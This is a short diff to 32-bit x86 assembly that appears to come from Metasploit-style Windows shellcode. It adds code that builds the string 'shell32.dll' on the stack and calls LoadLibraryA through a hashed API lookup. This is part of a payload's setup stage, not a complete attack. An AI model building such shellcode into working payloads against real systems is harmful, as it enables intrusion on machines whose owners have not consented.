@@ -7,6 +7,13 @@
 [BITS 32]
 ; Input: EBP must be the address of 'api_call'.
 
+push 0x006c6c64
+push 0x2e32336c
+push 0x6c656873
+push esp
+push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
+call ebp               ; LoadLibraryA("shell32.dll");
+
 push byte 127          ; Push down 127
 pop eax                ; And pop it into EAX
 shl eax, 3             ; Shift EAX left by 3 so it = 1016
